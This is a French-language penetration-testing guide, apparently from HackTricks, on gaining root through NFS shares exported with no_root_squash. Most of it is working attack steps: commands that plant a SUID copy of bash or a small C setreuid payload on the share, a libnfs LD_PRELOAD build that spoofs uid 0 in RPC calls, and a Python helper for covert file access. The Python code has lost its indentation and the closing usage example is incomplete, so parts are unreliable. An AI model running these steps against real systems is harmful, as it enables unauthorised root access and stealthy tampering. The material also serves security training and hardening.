# Élévation de privilèges par mauvaise configuration NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}


## Informations de base sur le squashing

NFS fait généralement (en particulier sous Linux) confiance aux `uid` et `gid` indiqués par le client qui se connecte pour accéder aux fichiers (si Kerberos n'est pas utilisé). Cependant, certaines configurations peuvent être définies sur le serveur pour **modifier ce comportement** :

- **`all_squash`** : cette option applique le squashing à tous les accès, en mappant chaque utilisateur et groupe vers **`nobody`** (65534 en non signé / -2 en signé). Ainsi, tout le monde est `nobody` et aucun utilisateur n'est utilisé.
- **`root_squash`/`no_all_squash`** : il s'agit du comportement par défaut sous Linux et cette option applique le squashing **uniquement aux accès avec l'uid 0 (root)**. Par conséquent, tous les `UID` et `GID` sont approuvés, mais `0` est mappé vers `nobody` (ainsi, aucune usurpation de root n'est possible).
- **``no_root_squash`** : lorsque cette configuration est activée, elle n'applique même pas le squashing à l'utilisateur root. Cela signifie que si vous montez un répertoire avec cette configuration, vous pouvez y accéder en tant que root.

Dans le fichier **/etc/exports**, si vous trouvez un répertoire configuré avec **no_root_squash**, vous pouvez y **accéder** en tant que **client** et **écrire à l'intérieur** de ce répertoire **comme si** vous étiez le **root** local de la machine.

Pour plus d'informations sur **NFS**, consultez :


{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Élévation de privilèges

### Exploit distant

Option 1 avec bash :
- **Monter ce répertoire** sur une machine cliente et, **en tant que root, copier** le binaire **/bin/bash** dans le répertoire monté, lui attribuer les droits **SUID**, puis **exécuter depuis** la machine **victime** ce binaire bash.
- Notez que pour être root à l'intérieur du partage NFS, **`no_root_squash`** doit être configuré sur le serveur.
- Cependant, si cette option n'est pas activée, vous pouvez obtenir les privilèges d'un autre utilisateur en copiant le binaire vers le partage NFS et en lui attribuant la permission SUID de l'utilisateur dont vous voulez obtenir les privilèges.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 avec du code compilé en C :
- **Monter ce répertoire** sur une machine cliente, puis **en tant que root, copier** dans le dossier monté notre payload compilé qui abusera de la permission SUID, lui attribuer les droits **SUID**, puis **exécuter depuis la machine victime** ce binaire (vous trouverez ici quelques [payloads SUID en C](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Mêmes restrictions qu'auparavant
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Notez que si vous pouvez créer un **tunnel depuis votre machine vers la machine victime, vous pouvez toujours utiliser la version Remote pour exploiter cette privilege escalation en tunnellant les ports requis**.\
> L'astuce suivante s'applique si le fichier `/etc/exports` **indique une IP**. Dans ce cas, vous **ne pourrez en aucun cas utiliser** le **remote exploit** et devrez **abuser de cette astuce**.\
> Une autre condition requise pour que l'exploit fonctionne est que **l'export dans `/etc/export`** **utilise le flag `insecure`**.\
> --_Je ne suis pas sûr que cette astuce fonctionne si `/etc/export` indique une adresse IP_--

### Informations de base

Le scénario implique l'exploitation d'un partage NFS monté sur une machine locale, en tirant parti d'une faille dans la spécification NFSv3 qui permet au client de spécifier son uid/gid, ce qui peut potentiellement permettre un accès non autorisé. L'exploitation consiste à utiliser [libnfs](https://github.com/sahlberg/libnfs), une library qui permet de forger des appels NFS RPC.

#### Compilation de la library

Les étapes de compilation de la library peuvent nécessiter des ajustements en fonction de la version du kernel. Dans ce cas précis, les syscalls fallocate ont été commentés. Le processus de compilation implique les commandes suivantes :
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Exécution de l'exploit

L'exploit consiste à créer un simple programme C (`pwn.c`) qui élève les privilèges à root, puis exécute un shell. Le programme est compilé, et le binaire résultant (`a.out`) est placé sur le share avec suid root, en utilisant `ld_nfs.so` pour falsifier l'uid dans les appels RPC :

1. **Compiler le code de l'exploit :**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Placez l'exploit sur le partage et modifiez ses permissions en usurpant l'uid :**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Exécutez l'exploit pour obtenir les privilèges root :**
```bash
/mnt/share/a.out
#root
```
### Bonus : NFShell pour un accès furtif aux fichiers

Une fois l'accès root obtenu, un script Python (`nfsh.py`) est utilisé pour interagir avec le partage NFS sans modifier le propriétaire (afin d'éviter de laisser des traces). Ce script ajuste l'uid afin qu'il corresponde à celui du fichier auquel on accède, permettant ainsi d'interagir avec les fichiers du partage sans problèmes de permissions :
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Exécuter comme :
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
